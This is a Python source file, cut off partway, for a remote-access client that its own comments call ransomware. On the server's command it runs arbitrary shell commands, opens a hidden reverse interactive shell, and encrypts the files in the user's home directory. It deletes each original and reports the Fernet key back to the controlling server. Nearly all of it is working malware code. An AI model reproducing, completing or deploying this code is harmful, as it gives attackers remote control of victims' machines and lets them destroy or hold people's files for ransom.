
import ssl
import socket
import threading
import os
import subprocess
import shlex
import platform
import time
import logging
import base64 # For key encoding
from cryptography.fernet import Fernet, InvalidToken # Encryption library
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import traceback # For detailed error logging

# --- Client Logging Setup ---
log_format = '%(asctime)s - %(threadName)s - %(levelname)s - %(message)s'
logging.basicConfig(level=logging.INFO, format=log_format)
# Use standard logging
client_logger = logging.getLogger()

ENCRYPTION_EXTENSION = ".acelocked" # Extension for encrypted files
# Directories/paths to exclude from encryption/decryption (relative to home dir or absolute)
# Add more paths specific to OS as needed (e.g., Application Data, Library)
EXCLUSION_LIST = [
    # Windows specific (add more as needed)
    "AppData",
    "Local Settings",
    "Application Data",
    "Cookies",
    "Recent",
    "SendTo",
    "Start Menu",
    "Templates",
    "Windows",
    "Program Files",
    "Program Files (x86)",
    "ProgramData",
    # macOS specific (add more as needed)
    "Library",
    "/Applications",
    "/System",
    "/usr",
    "/bin",
    "/sbin",
    "/etc",
    # Linux specific (add more as needed)
    "/usr",
    "/bin",
    "/sbin",
    "/etc",
    "/lib",
    "/lib64",
    "/sys",
    "/proc",
    "/dev",
    "/run",
    ".local/share/Trash", # Common trash location
    ".cache",
    # Cross-platform (avoid encrypting common dev/config dirs)
    ".git",
    ".ssh",
    ".config",
    ".vscode",
    "node_modules",
    "venv",
    ".env",
    "__pycache__",
    # Avoid self-encryption if running from user dir (adjust if needed)
    os.path.basename(__file__) if os.path.dirname(__file__) == os.path.expanduser("~") else None,
]
# Filter out None in case the script isn't in home dir
EXCLUSION_LIST = [item for item in EXCLUSION_LIST if item is not None]

class Client:
    def __init__(self, host: str, port: int, cert_path=None):
        self.host = host
        self.port = port
        self.running = False
        self.client_socket = None # Initialize later
        self.secure_socket = None # Initialize later

        # --- SSL Context Setup ---
        self.cert_path = cert_path
        self.ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2

        if self.cert_path and os.path.exists(self.cert_path):
             client_logger.info(f"Loading CA/Server certificate for verification from: {self.cert_path}")
             try:
                 self.ssl_context.load_verify_locations(cafile=self.cert_path)
                 self.ssl_context.verify_mode = ssl.CERT_REQUIRED
                 self.ssl_context.check_hostname = True
                 client_logger.info("SSL verification enabled (CERT_REQUIRED).")
             except ssl.SSLError as e:
                  client_logger.error(f"Failed to load CA certificate from {self.cert_path}: {e}. Falling back to no verification.")
                  self.ssl_context.check_hostname = False
                  self.ssl_context.verify_mode = ssl.CERT_NONE
             except Exception as e:
                  client_logger.error(f"Unexpected error loading CA certificate: {e}. Falling back to no verification.")
                  self.ssl_context.check_hostname = False
                  self.ssl_context.verify_mode = ssl.CERT_NONE
        else:
            client_logger.warning(f"No valid cert_path provided ('{self.cert_path}'). Server certificate will NOT be verified (CERT_NONE). Connection vulnerable to MITM.")
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
        # --- End SSL Context Setup ---

        self.shell_process = None # To hold the Popen object for shell mode
        # Event to signal shell reader/writer threads to stop
        self.shell_active_event = threading.Event()

    def start_client(self):
        """
        Connects to the server and starts the main message processing loop.
        Returns:
            bool: True if connection and initial communication succeeded, False otherwise.
        """
        try:
            client_logger.info(f"Attempting connection to {self.host}:{self.port}...")
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Wrap socket *before* connecting
            self.secure_socket = self.ssl_context.wrap_socket(self.client_socket, server_hostname=self.host)
            self.secure_socket.connect((self.host, self.port))
            client_logger.info(f"Secure connection established to {self.host}:{self.port}")
            # Log TLS connection details
            try:
                cipher = self.secure_socket.cipher()
                client_logger.info(f"TLS Cipher: {cipher[0]}, Version: {cipher[1]}, Bits: {cipher[2]}")
            except Exception: pass # Cipher info might not be available

            self.running = True
            client_logger.info("Starting message loop...")
            # Run the message loop directly in the current thread
            self.message_loop()
            client_logger.info("Message loop finished normally.")
            return True
        except ssl.SSLCertVerificationError as e:
             client_logger.error(f"SSL Certificate Verification Error: {e}. Ensure client trusts the server's certificate or disable verification (less secure).")
        except ssl.SSLError as e:
             client_logger.error(f"SSL Error during connection: {e}")
             client_logger.error("Check server status, certificate validity, and matching TLS protocols/ciphers.")
        except socket.gaierror as e:
             client_logger.error(f"Address/Hostname Error: {e}. Could not resolve '{self.host}'.")
        except ConnectionRefusedError as e:
              client_logger.error(f"Connection Refused: {e}. Is the server running on {self.host}:{self.port}?")
        except socket.timeout:
              client_logger.error("Connection timed out. Server might be unreachable or firewall blocking.")
        except socket.error as e:
            client_logger.error(f"Socket Connection Error: {e}")
        except Exception as e:
             client_logger.critical(f"Unexpected critical error during startup: {e}", exc_info=True)
        finally:
             # Ensure cleanup happens if loop exits unexpectedly or startup fails
             if self.running:
                  client_logger.warning("Performing cleanup due to unexpected exit/failure in start_client.")
                  self.stop_client()
        return False # Indicate startup or loop failed

    def message_loop(self):
        """
        Continuously receive and process messages from the server.
        Runs in the main client thread. Blocks for interactive_shell_session.
        """
        buffer_size = 4096
        partial_message = b"" # Buffer for handling messages split across recv calls

        while self.running:
            try:
                data = self.secure_socket.recv(buffer_size)
                if not data:
                    client_logger.info("Server closed the connection (received 0 bytes).")
                    self.running = False
                    break

                # Append new data to buffer
                partial_message += data

                # Process complete messages separated by newline
                while b'\n' in partial_message:
                     message_bytes, partial_message = partial_message.split(b'\n', 1)
                     try:
                          message = message_bytes.decode('utf-8', errors='replace')
                          if message: # Avoid processing empty strings from consecutive newlines
                              client_logger.debug(f"Processing complete message: {message[:70]}...")
                              self.handle_message(message)
                     except UnicodeDecodeError as ue:
                          client_logger.error(f"Unicode decode error processing message chunk: {ue}. Chunk: {message_bytes!r}")
                     except Exception as handle_e:
                          client_logger.error(f"Error handling message '{message_bytes.decode(errors='ignore')}': {handle_e}", exc_info=True)


            except ConnectionResetError:
                 client_logger.warning("Connection reset by peer.")
                 self.running = False
            except socket.timeout:
                 client_logger.warning("Socket receive timed out (should not happen with default blocking sockets).")
                 continue # Or break depending on desired behavior
            except ssl.SSLWantReadError:
                 client_logger.debug("SSLWantReadError, waiting for socket readiness (non-blocking socket?).")
                 # Handle appropriately if using non-blocking sockets (e.g., with selectors)
                 time.sleep(0.1)
                 continue
            except ssl.SSLError as e:
                 client_logger.error(f"SSL Error during receive: {e}")
                 self.running = False
            except socket.error as e:
                if self.running:
                    client_logger.error(f"Socket Error receiving message: {e}")
                self.running = False
            except Exception as e:
                 client_logger.error(f"Unexpected error in message loop: {e}", exc_info=True)
                 self.running = False # Stop on unexpected errors

        # Check if there's leftover data when loop exits
        if partial_message:
             client_logger.warning(f"Message loop exiting with unprocessed data: {partial_message!r}")
        client_logger.info("Exiting message loop.")


    def handle_message(self, message: str):
        """
        Routes commands received from the server based on expected prefixes.
        """
        # *** CHANGE HERE: Match prefix from updated CommandShell.do_cmd ***
        if message.startswith("EXEC "):
            command_part = message[len("EXEC "):].strip()
            if command_part:
                 client_logger.info(f"Received single command execution request: {command_part}")
                 result = self.execute_single_command(command_part)
                 self.send_message(result) # Send result back
            else:
                 client_logger.warning("Received EXEC command with no actual command.")
                 self.send_message("ERROR: No command provided for EXEC\n")

        elif message == "SHELL_START": # Trigger for interactive shell
             client_logger.info("Received SHELL_START command. Entering interactive shell mode...")
             self.interactive_shell_session() # This call blocks until shell exits
             client_logger.info("Exited interactive shell mode.")

        elif message == "PING": # Example keepalive
             client_logger.debug("Received PING, sending PONG.")
             self.send_message("PONG\n")

             # --- Ransomware Commands ---
        elif message == "ENCRYPT":
            client_logger.info("Received ENCRYPT command. Starting encryption process in background thread.")
            # Start encryption in a separate thread to avoid blocking message loop
            encryption_thread = threading.Thread(
                target=self.perform_file_operation,
                args=('encrypt',),
                name="EncryptionThread",
                daemon=True  # Allows main program to exit even if this fails badly
            )
            encryption_thread.start()

        elif message.startswith("DECRYPT "):
            parts = message.split(" ", 1)
            if len(parts) == 2 and parts[1]:
                key_b64 = parts[1].strip()
                client_logger.info("Received DECRYPT command. Starting decryption process in background thread.")
                try:
                    # Decode the key passed from the command shell
                    key_bytes = base64.urlsafe_b64decode(key_b64)
                    if len(key_bytes) != 32:  # Fernet keys are 32 bytes url-safe base64 encoded
                        raise ValueError("Invalid key length after decoding.")

                    # Start decryption in a separate thread
                    decryption_thread = threading.Thread(
                        target=self.perform_file_operation,
                        args=('decrypt', key_bytes),
                        name="DecryptionThread",
                        daemon=True
                    )
                    decryption_thread.start()
                except (ValueError, base64.binascii.Error) as e:
                    err_msg = f"ERROR: Invalid decryption key format received: {e}\n"
                    client_logger.error(err_msg)
                    self.send_message(err_msg)
                except Exception as e:
                    err_msg = f"ERROR: Unexpected error processing decryption key: {e}\n"
                    client_logger.error(err_msg, exc_info=True)
                    self.send_message(err_msg)
            else:
                err_msg = "ERROR: DECRYPT command received without a key.\n"
                client_logger.warning(err_msg)
                self.send_message(err_msg)



    def execute_single_command(self, command: str) -> str:
        """
        Executes a single, non-interactive shell command and returns formatted output.
        """
        client_logger.info(f"Executing command: {command}")
        output = ""
        try:
            # shell=True is a potential security risk if command string comes from
            # untrusted sources. If commands are simple executables with args,
            # consider using shlex.split(command) and shell=False.
            result = subprocess.run(
                command,
                shell=True, # Allows shell features like pipes, but use with caution
                capture_output=True,
                text=False, # Capture raw bytes
                timeout=60, # Increased timeout slightly
                check=False # Don't raise exception on non-zero exit code
            )
            # Decode output using utf-8, replacing errors
            stdout = result.stdout.decode('utf-8', errors='replace')
            stderr = result.stderr.decode('utf-8', errors='replace')

            output = f"Return Code: {result.returncode}\n"
            output += f"--- STDOUT ---\n{stdout}\n"
            output += f"--- STDERR ---\n{stderr}\n"
            client_logger.info(f"Command '{command}' finished with return code {result.returncode}")

        except subprocess.TimeoutExpired:
            client_logger.error(f"Command '{command}' timed out after 60 seconds.")
            output = f"ERROR: Command '{command}' timed out after 60 seconds\n"
        except FileNotFoundError:
             client_logger.error(f"Command not found: {command.split()[0]}")
             output = f"ERROR: Command not found: {command.split()[0]}\n"
        except Exception as e:
            client_logger.error(f"Exception during command execution '{command}': {e}", exc_info=True)
            output = f"ERROR: Exception during command execution: {str(e)}\n"

        return output # Always return a string


    def _read_shell_stream(self, stream, stream_name):
        """
        Worker thread function: Reads a stream (stdout/stderr) from the shell process
        and sends the data back to the server socket until signaled to stop.
        """
        client_logger.debug(f"Starting reader thread for shell {stream_name}")
        try:
            while self.running and not self.shell_active_event.is_set():
                 # Check if stream is closed before attempting read
                 if stream.closed:
                      client_logger.info(f"Shell {stream_name} stream found closed.")
                      break

                 # Read available bytes without blocking indefinitely
                 # Using os.read might be more robust for non-blocking reads if needed,
                 # but Popen pipes usually work well with simple reads.
                 chunk = stream.read(1024) # Read up to 1024 bytes

                 if not chunk:
                      client_logger.info(f"Shell {stream_name} stream EOF.")
                      break # End of stream

                 client_logger.debug(f"Read {len(chunk)} bytes from shell {stream_name}")
                 try:
                      # Send data immediately back to server
                      if self.secure_socket and not self.secure_socket._closed:
                           self.secure_socket.sendall(chunk)
                           client_logger.debug(f"Sent {len(chunk)} bytes from {stream_name} to server")
                      else:
                           client_logger.warning(f"Cannot send {stream_name} data, socket is closed.")
                           break
                 except (socket.error, ssl.SSLError, BrokenPipeError) as sock_err:
                       client_logger.error(f"Socket error sending shell {stream_name} data: {sock_err}")
                       self.shell_active_event.set() # Signal main shell loop to stop
                       break
                 except Exception as e:
                        client_logger.error(f"Unexpected error sending {stream_name} data: {e}")
                        self.shell_active_event.set()
                        break

        except OSError as e:
             # Can happen if the process is killed/stream closed unexpectedly
             if self.running and not self.shell_active_event.is_set():
                 client_logger.error(f"OS Error reading shell {stream_name}: {e}")
        except ValueError as e:
             # Can happen if trying to read from a closed stream
             if self.running and not self.shell_active_event.is_set():
                  client_logger.error(f"ValueError reading shell {stream_name} (likely closed): {e}")
        except Exception as e:
            # Log unexpected errors but check flags to avoid noise during shutdown
            if self.running and not self.shell_active_event.is_set():
                client_logger.error(f"Unexpected error in {stream_name} reader thread: {e}", exc_info=True)
        finally:
             client_logger.info(f"{stream_name} reader thread finished.")
             # Ensure event is set if this thread exits, to help terminate shell session
             self.shell_active_event.set()


    def interactive_shell_session(self):
        """
        Manages the interactive shell process (Popen) and its I/O handling via threads.
        Blocks the calling thread (message_loop) until the shell session ends.
        """
        # Determine appropriate shell for the OS
        if platform.system() == "Windows":
            shell_path = os.environ.get("COMSPEC", "cmd.exe") # Get actual cmd path
            shell_executable = [shell_path]
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = subprocess.SW_HIDE # Hide window
            creationflags = subprocess.CREATE_NO_WINDOW # No console window
        else:
            # Prefer bash, fallback to sh
            shell_path = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
            shell_executable = [shell_path, "-i"] # Request interactive mode if possible
            startupinfo = None
            creationflags = 0

        # Reset state for a new session
        self.shell_active_event.clear()
        stdout_thread = None
        stderr_thread = None
        self.shell_process = None # Ensure it's cleared before starting

        try:
            client_logger.info(f"Starting persistent interactive shell: {' '.join(shell_executable)}")
            self.shell_process = subprocess.Popen(
                shell_executable,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                bufsize=0, # Use 0 or 1 for line buffering/unbuffered
                startupinfo=startupinfo,
                creationflags=creationflags
                # Consider adding cwd=... if needed
            )
            client_logger.info(f"Shell process started (PID: {self.shell_process.pid})")

            # Start threads to read stdout and stderr concurrently
            stdout_thread = threading.Thread(
                target=self._read_shell_stream,
                args=(self.shell_process.stdout, "stdout"),
                name="ShellStdoutReader", daemon=True)
            stderr_thread = threading.Thread(
                target=self._read_shell_stream,
                args=(self.shell_process.stderr, "stderr"),
                name="ShellStderrReader", daemon=True)
            stdout_thread.start()
            stderr_thread.start()

            # Loop receiving commands from server and writing to shell stdin
            while self.running and not self.shell_active_event.is_set():
                 # Check if Popen process died unexpectedly
                 if self.shell_process.poll() is not None:
                      client_logger.warning(f"Shell process (PID: {self.shell_process.pid}) exited unexpectedly with code {self.shell_process.poll()}.")
                      self.shell_active_event.set() # Signal threads/loop to stop
                      break

                 try:
                      # Use a timeout on recv to periodically check flags/events
                      self.secure_socket.settimeout(0.5) # Check every 0.5 seconds
                      try:
                           shell_cmd_bytes = self.secure_socket.recv(4096)
                           # Only reset timeout if data was actually received
                           if shell_cmd_bytes:
                                self.secure_socket.settimeout(None) # Reset after successful recv

                           if not shell_cmd_bytes:
                                client_logger.warning("Server disconnected during active shell mode.")
                                self.shell_active_event.set()
                                break

                           # Process message (handle potential partial reads - though unlikely with prompt->response)
                           # For simplicity here, assume full command lines arrive due to server sending line by line
                           shell_cmd = shell_cmd_bytes.decode('utf-8', errors='replace').strip()
                           if not shell_cmd: continue # Ignore empty lines if recv gets partials ending in \n

                           client_logger.info(f"Shell Input Received: '{shell_cmd}'")

                           # Check for exit command sent by the server's CommandShell
                           if shell_cmd.lower() == "exit":
                                client_logger.info("'exit' command received from server. Terminating shell process...")
                                self.shell_active_event.set() # Signal reader threads
                                try:
                                     # Write exit command + newline to the actual shell
                                     # This allows the shell (e.g., bash, cmd) to terminate itself
                                     if not self.shell_process.stdin.closed:
                                         self.shell_process.stdin.write("exit\n".encode('utf-8'))
                                         self.shell_process.stdin.flush()
                                     else:
                                          client_logger.warning("Shell stdin already closed when sending 'exit'.")
                                except (OSError, ValueError) as e:
                                     client_logger.error(f"Error writing 'exit' to shell stdin (may be closed): {e}")
                                # No need to send anything back, server just stops sending
                                break # Exit the command receiving loop

                           # Send the received command + newline to the shell process's stdin
                           if not self.shell_process.stdin.closed:
                                self.shell_process.stdin.write((shell_cmd + "\n").encode('utf-8'))
                                self.shell_process.stdin.flush()
                                client_logger.debug(f"Wrote '{shell_cmd}\\n' to shell stdin")
                           else:
                                client_logger.error("Cannot write to shell stdin, it's closed.")
                                self.shell_active_event.set() # Stop if we can't send commands
                                break

                      except socket.timeout:
                            # Timeout is expected, allows checking running/event flags
                            client_logger.debug("Shell command recv timeout, checking status...")
                            continue # Continue loop to check flags and try receiving again
                      except (OSError, ValueError) as e:
                           # stdin might be closed if shell process died
                           client_logger.error(f"Error writing to shell stdin (shell process likely dead): {e}")
                           self.shell_active_event.set()
                           break

                 except ConnectionResetError:
                      client_logger.warning("Connection reset by peer during shell mode.")
                      self.shell_active_event.set()
                 except (socket.error, ssl.SSLError) as e:
                      client_logger.error(f"Socket Error during shell mode receive/send: {e}")
                      self.shell_active_event.set()
                 except Exception as e:
                      client_logger.error(f"Unexpected error in shell command loop: {e}", exc_info=True)
                      self.shell_active_event.set()
                 # Break outer loop if event is set by any exception
                 if self.shell_active_event.is_set():
                     break


        except FileNotFoundError:
             err_msg = f"ERROR: Shell executable not found on client: {' '.join(shell_executable)}\n"
             client_logger.error(err_msg.strip())
             self.send_message(err_msg) # Try to inform the server
        except Exception as e:
             err_msg = f"ERROR: Failed to start or manage shell process on client: {e}\n"
             client_logger.error(err_msg.strip(), exc_info=True)
             self.send_message(err_msg) # Try to inform the server
        finally:
            # --- Shell Session Cleanup ---
            client_logger.info("Cleaning up interactive shell session...")
            self.shell_active_event.set() # Ensure reader threads know to stop
            self.secure_socket.settimeout(None) # Reset socket timeout to blocking

            # Close Popen streams safely
            if self.shell_process:
                 pid = self.shell_process.pid # Get PID before potentially closing streams
                 client_logger.info(f"Closing streams for shell process (PID: {pid})...")
                 for stream in [self.shell_process.stdin, self.shell_process.stdout, self.shell_process.stderr]:
                     if stream:
                         try:
                             stream.close()
                         except Exception as close_err:
                             client_logger.debug(f"Error closing stream {stream}: {close_err}")

                 # Terminate/Kill the process
                 try:
                      client_logger.info(f"Terminating shell process (PID: {pid})...")
                      self.shell_process.terminate() # Ask nicely first
                      try:
                           # Wait briefly for it to exit
                           ret_code = self.shell_process.wait(timeout=0.5)
                           client_logger.info(f"Shell process (PID: {pid}) terminated gracefully with code {ret_Code}.")
                      except subprocess.TimeoutExpired:
                           client_logger.warning(f"Shell process (PID: {pid}) did not terminate gracefully, killing...")
                           self.shell_process.kill() # Force kill
                           self.shell_process.wait(timeout=1.0) # Wait for kill confirmation
                           client_logger.info(f"Shell process (PID: {pid}) killed.")
                 except ProcessLookupError:
                       client_logger.warning(f"Shell process (PID: {pid}) already finished before cleanup.")
                 except Exception as kill_err:
                      client_logger.error(f"Error terminating/killing shell process (PID: {pid}): {kill_err}")
                 self.shell_process = None # Clear reference

            # Wait for reader threads (they should exit quickly once event is set/streams closed)
            threads_to_join = [t for t in [stdout_thread, stderr_thread] if t and t.is_alive()]
            if threads_to_join:
                 client_logger.info(f"Waiting for {len(threads_to_join)} shell reader thread(s) to finish...")
                 for t in threads_to_join:
                     t.join(timeout=1.0)
                     if t.is_alive():
                         client_logger.warning(f"Shell reader thread '{t.name}' did not exit cleanly.")
            client_logger.info("Shell cleanup complete.")
            # --- End Shell Session Cleanup ---


    def send_message(self, message: str):
        """
        Sends a message string to the server, ensuring it ends with a newline.
        Returns True on success, False on failure.
        """
        if not self.running:
             client_logger.warning("Attempted to send message while client not running.")
             return False
        if not self.secure_socket or self.secure_socket._closed:
             client_logger.error("Cannot send message: Socket is not connected or closed.")
             self.running = False # Ensure state reflects reality
             return False

        try:
            # Ensure message ends with newline for clear separation
            if not message.endswith('\n'):
                 message += '\n'
            encoded_msg = message.encode('utf-8')
            self.secure_socket.sendall(encoded_msg)
            client_logger.debug(f"Sent {len(encoded_msg)} bytes to server.")
            return True
        except (socket.error, ssl.SSLError, BrokenPipeError) as e:
            client_logger.error(f"Socket error sending message: {e}")
            self.running = False # Assume connection is dead
            # Trigger full cleanup via stop_client if needed, but message_loop should handle exit
            return False
        except Exception as e:
            client_logger.error(f"Unexpected error sending message: {e}", exc_info=True)
            self.running = False
            return False

    def lock_user(self):
        pass


    def stop_client(self):
        """
        Stops the client, closes connections, and attempts graceful cleanup.
        """
        # Prevent multiple stop calls running concurrently
        if not self.running:
            client_logger.debug("stop_client called but client already stopped.")
            return

        client_logger.info("Stopping client...")
        self.running = False # Signal all loops and threads to terminate

        # If interactive shell is active, signal its threads/loop first
        if self.shell_process and self.shell_process.poll() is None: # Check if process exists and is running
             client_logger.info("Signaling active shell session to terminate...")
             self.shell_active_event.set()
             # Give the shell session a moment to react before closing the main socket
             time.sleep(0.2) # Short delay

        # Close the main socket gracefully
        sock_ref = self.secure_socket
        if sock_ref and not sock_ref._closed:
            client_logger.info("Closing secure socket...")
            try:
                 # Try shutdown first, might fail if already disconnected
                 sock_ref.shutdown(socket.SHUT_RDWR)
            except (socket.error, ssl.SSLError, OSError) as shutdown_err:
                 client_logger.debug(f"Info during socket shutdown (may be ok): {shutdown_err}")
            except Exception as e:
                 client_logger.error(f"Unexpected error during socket shutdown: {e}")
            try:
                 sock_ref.close()
                 client_logger.info("Secure socket closed.")
            except (socket.error, ssl.SSLError, OSError) as close_err:
                client_logger.error(f"Error closing secure socket: {close_err}")
            except Exception as e:
                 client_logger.error(f"Unexpected error closing socket: {e}")
        else:
            client_logger.debug("Socket already closed or not initialized during stop.")

        # Clear references
        self.secure_socket = None
        self.client_socket = None # Underlying plain socket

        # Shell process cleanup is handled within interactive_shell_session's finally block

        client_logger.info("Client stop sequence finished.")
    # --- Ransomware Core Logic ---

    def _is_excluded(self, filepath: str, home_dir: str) -> bool:
        """Checks if a file path should be excluded based on the EXCLUSION_LIST."""
        normalized_path = os.path.normpath(filepath)
        normalized_home = os.path.normpath(home_dir)

        # Check against absolute paths in exclusion list
        for excluded_item in EXCLUSION_LIST:
             if os.path.isabs(excluded_item):
                  if normalized_path.startswith(os.path.normpath(excluded_item)):
                     client_logger.debug(f"Excluding '{filepath}' (matches absolute exclude: {excluded_item})")
                     return True
             else:
                  # Check against relative paths (assume relative to home)
                  excluded_abs = os.path.join(normalized_home, excluded_item)
                  if normalized_path.startswith(os.path.normpath(excluded_abs)):
                     client_logger.debug(f"Excluding '{filepath}' (matches relative exclude: {excluded_item})")
                     return True
        return False


    def find_target_files(self, mode: str) -> list[str]:
        """
        Finds files to encrypt or decrypt, starting from the user's home directory.
        Excludes specified directories and the script itself.
        """
        target_files = []
        try:
            home_dir = os.path.expanduser("~")
            if not os.path.isdir(home_dir):
                client_logger.error(f"Home directory '{home_dir}' not found or not accessible.")
                return []
            client_logger.info(f"Scanning for files starting from: {home_dir}")
        except Exception as e:
             client_logger.error(f"Could not determine home directory: {e}")
             return []

        # --- VERY IMPORTANT WARNING ---
        client_logger.warning("!!! FILE OPERATION SCAN STARTED !!!")
        client_logger.warning(f"Mode: {mode.upper()}. Target dir: {home_dir}")
        client_logger.warning("This operation is potentially DESTRUCTIVE.")
        # --- END WARNING ---

        for root, dirs, files in os.walk(home_dir, topdown=True):
            # Check if the current directory itself should be excluded
            if self._is_excluded(root, home_dir):
                client_logger.debug(f"Skipping excluded directory: {root}")
                dirs[:] = [] # Don't recurse into subdirectories of excluded path
                continue

            # Filter directories in-place to prevent walking into excluded ones later
            # Necessary because _is_excluded checks the *start* of the path
            dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d), home_dir)]

            for filename in files:
                filepath = os.path.join(root, filename)

                # Final check on the file itself (redundant but safe)
                if self._is_excluded(filepath, home_dir):
                     continue

                # Check file extension based on mode
                if mode == 'encrypt':
                    # Avoid encrypting already encrypted files or system/hidden files (basic check)
                    if not filename.endswith(ENCRYPTION_EXTENSION) and not filename.startswith('.'):
                        target_files.append(filepath)
                elif mode == 'decrypt':
                    # Only target files with the specific encryption extension
                    if filename.endswith(ENCRYPTION_EXTENSION):
                        target_files.append(filepath)

        client_logger.info(f"Found {len(target_files)} potential target files for {mode}.")
        return target_files

    def _encrypt_file(self, fernet: Fernet, filepath: str) -> tuple[bool, str]:
        """Encrypts a single file, overwrites original."""
        encrypted_filepath = filepath + ENCRYPTION_EXTENSION
        client_logger.debug(f"Attempting to encrypt: {filepath}")
        try:
            # Read original content
            with open(filepath, 'rb') as f_orig:
                original_content = f_orig.read()

            # Encrypt content
            encrypted_content = fernet.encrypt(original_content)

            # Write encrypted content to new file
            with open(encrypted_filepath, 'wb') as f_enc:
                f_enc.write(encrypted_content)

            # Verify write (optional but good practice)
            if os.path.getsize(encrypted_filepath) == 0 and len(encrypted_content) > 0:
                 raise OSError(f"Write verification failed: '{encrypted_filepath}' is 0 bytes.")

            # --- Destructive Action: Remove Original ---
            try:
                 os.remove(filepath)
                 client_logger.info(f"Encrypted '{filepath}' -> '{encrypted_filepath}' and removed original.")
                 return True, f"Encrypted {os.path.basename(filepath)}"
            except OSError as rm_err:
                 # If removal fails, try to remove the newly created encrypted file to avoid partial state
                 client_logger.error(f"Failed to remove original file '{filepath}' after encryption: {rm_err}. Attempting cleanup.")
                 try: os.remove(encrypted_filepath)
                 except: pass
                 return False, f"ERROR: Failed to remove original {os.path.basename(filepath)}: {rm_err}"
            # --- End Destructive Action ---

        except (IOError, OSError) as e:
            client_logger.error(f"I/O Error encrypting '{filepath}': {e}")
            # Clean up potentially created empty encrypted file
            if os.path.exists(encrypted_filepath) and os.path.getsize(encrypted_filepath) == 0:
                try: os.remove(encrypted_filepath)
                except: pass
            return False, f"ERROR: I/O Error encrypting {os.path.basename(filepath)}: {e}"
        except InvalidToken: # Should not happen with encrypt, but belt-and-suspenders
             client_logger.error(f"Invalid Token during encryption (unexpected): {filepath}")
             return False, f"ERROR: Crypto Token Error encrypting {os.path.basename(filepath)}"
        except Exception as e:
            client_logger.error(f"Unexpected Error encrypting '{filepath}': {e}", exc_info=True)
            # Clean up potentially created empty encrypted file
            if os.path.exists(encrypted_filepath) and os.path.getsize(encrypted_filepath) == 0:
                try: os.remove(encrypted_filepath)
                except: pass
            return False, f"ERROR: Unexpected error encrypting {os.path.basename(filepath)}: {e}"

    def _decrypt_file(self, fernet: Fernet, filepath: str) -> tuple[bool, str]:
        """Decrypts a single file, removes encrypted original."""
        if not filepath.endswith(ENCRYPTION_EXTENSION):
            return False, f"ERROR: File '{os.path.basename(filepath)}' does not have expected extension '{ENCRYPTION_EXTENSION}'"

        original_filepath = filepath[:-len(ENCRYPTION_EXTENSION)]
        client_logger.debug(f"Attempting to decrypt: {filepath}")
        try:
            # Read encrypted content
            with open(filepath, 'rb') as f_enc:
                encrypted_content = f_enc.read()
                if not encrypted_content: # Handle empty files if they exist
                    client_logger.warning(f"Skipping empty encrypted file: {filepath}")
                    # Optionally remove the empty file here
                    # try: os.remove(filepath) except: pass
                    return False, f"Skipped empty file {os.path.basename(filepath)}"


            # Decrypt content
            decrypted_content = fernet.decrypt(encrypted_content)

            # Write decrypted content back to original filename
            with open(original_filepath, 'wb') as f_dec:
                f_dec.write(decrypted_content)

            # Verify write (optional)
            if os.path.getsize(original_filepath) == 0 and len(decrypted_content) > 0:
                 raise OSError(f"Write verification failed: '{original_filepath}' is 0 bytes.")

            # --- Destructive Action: Remove Encrypted File ---
            try:
                 os.remove(filepath)
                 client_logger.info(f"Decrypted '{filepath}' -> '{original_filepath}' and removed encrypted file.")
                 return True, f"Decrypted {os.path.basename(original_filepath)}"
            except OSError as rm_err:
                 # If removal fails, try to remove the newly created decrypted file to avoid partial state
                 client_logger.error(f"Failed to remove encrypted file '{filepath}' after decryption: {rm_err}. Attempting cleanup.")
                 try: os.remove(original_filepath)
                 except: pass
                 return False, f"ERROR: Failed to remove encrypted {os.path.basename(filepath)}: {rm_err}"
            # --- End Destructive Action ---

        except InvalidToken:
            client_logger.error(f"Decryption failed (Invalid Token - wrong key or corrupted file?): {filepath}")
            return False, f"ERROR: Decryption failed for {os.path.basename(filepath)} (Wrong Key / Corrupted?)"
        except (IOError, OSError) as e:
            client_logger.error(f"I/O Error decrypting '{filepath}': {e}")
            # Clean up potentially created empty decrypted file
            if os.path.exists(original_filepath) and os.path.getsize(original_filepath) == 0:
                try: os.remove(original_filepath)
                except: pass
            return False, f"ERROR: I/O Error decrypting {os.path.basename(filepath)}: {e}"
        except Exception as e:
            client_logger.error(f"Unexpected Error decrypting '{filepath}': {e}", exc_info=True)
            # Clean up potentially created empty decrypted file
            if os.path.exists(original_filepath) and os.path.getsize(original_filepath) == 0:
                try: os.remove(original_filepath)
                except: pass
            return False, f"ERROR: Unexpected error decrypting {os.path.basename(filepath)}: {e}"


    def perform_file_operation(self, mode: str, key_bytes: bytes = None):
        """
        Worker function (run in a thread) to perform encryption or decryption.
        Sends status updates back to the server.
        """
        start_time = time.time()
        processed_count = 0
        error_count = 0
        status_interval = 5 # Send update every N files processed
        last_status_time = start_time

        try:
            if mode == 'encrypt':
                # Generate a new key for each encryption operation
                key_bytes = Fernet.generate_key()
                fernet = Fernet(key_bytes)
                key_b64 = base64.urlsafe_b64encode(key_bytes).decode('utf-8')
                self.send_message(f"STATUS: Starting encryption. Generated key (KEEP SAFE!): {key_b64}\n")
                client_logger.info(f"Generated Fernet key for encryption: {key_b64}")
            elif mode == 'decrypt':
                if not key_bytes:
                    err_msg = "ERROR: Decryption started without a key.\n"
                    client_logger.error(err_msg)
                    self.send_message(err_msg)
                    return
                try:
                    fernet = Fernet(key_bytes)
                    key_b64 = base64.urlsafe_b64encode(key_bytes).decode('utf-8') # For logging only
                    self.send_message("STATUS: Starting decryption with provided key.\n")
                    client_logger.info(f"Using provided Fernet key for decryption: {key_b64}")
                except (ValueError, TypeError) as key_err:
                    err_msg = f"ERROR: Invalid key provided for decryption: {key_err}\n"
                    client_logger.error(err_msg)
                    self.send_message(err_msg)
                    return
            else:
                self.send_message(f"ERROR: Invalid mode '{mode}' requested.\n")
                return

            # Find files (this can take time)
            self.send_message("STATUS: Scanning for target files...\n")
            target_files = self.find_target_files(mode)
            if not target_files:
